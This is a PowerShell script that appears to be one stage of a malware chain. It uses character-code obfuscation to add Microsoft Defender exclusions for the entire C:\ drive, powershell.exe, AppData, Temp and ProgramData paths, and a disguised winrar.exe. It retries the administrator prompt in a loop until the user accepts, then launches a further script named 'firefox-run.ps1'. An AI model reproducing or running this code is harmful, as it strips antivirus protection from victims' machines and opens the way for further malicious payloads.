Start-Sleep 2
 $probs = New-Object System.Diagnostics.ProcessStartInfo
 $probs.FileName = "powershell"

# The command for excluding Target.exe as a process is appended at the end
 $probs.Arguments = "-ExecutionPolicy Bypass -c ""&('Add-MpPreference'.Replace('Add','Add')) -ExclusionPath (-join[char[]](@(67,58,92))); &('Add-MpPreference'.Replace('Add','Add')) -ExclusionProcess (-join[char[]](@(112,111,119,101,114,115,104,101,108,108,46,101,120,101))); &('Add-MpPreference'.Replace('Add','Add')) -ExclusionPath ((-join[char[]](@(67,58,92,85,115,101,114,115,92))) + `$env:USERNAME + (-join[char[]](@(92,65,112,112,68,97,116,97,92,76,111,99,97,108,92,84,101,109,112)))); &('Add-MpPreference'.Replace('Add','Add')) -ExclusionPath ((-join[char[]](@(67,58,92,85,115,101,114,115,92))) + `$env:USERNAME + (-join[char[]](@(92,65,112,112,68,97,116,97,92,76,111,99,97,108)))); &('Add-MpPreference'.Replace('Add','Add')) -ExclusionPath (-join[char[]](@(67,58,92,80,114,111,103,114,97,109,68,97,116,97,92,119,105,110,114,97,114,46,101,120,101))); &('Add-MpPreference'.Replace('Add','Add')) -ExclusionProcess (-join[char[]](@(73,115,67,111,109,112,108,101,116,101,100,46,101,120,101))); &('Add-MpPreference'.Replace('Add','Add')) -ExclusionPath (-join[char[]](@(67,58,92,80,114,111,103,114,97,109,68,97,116,97)))"""
 $probs.Verb = "runas"
 $probs.WindowStyle = 1



$i = $true
do {
    try {
        [System.Diagnostics.Process]::Start($probs)
        $i = $false
    } catch {}
} while ($i)

Start-Sleep 35


$prt = Join-Path $PSScriptRoot "firefox-run.ps1"
& $prt
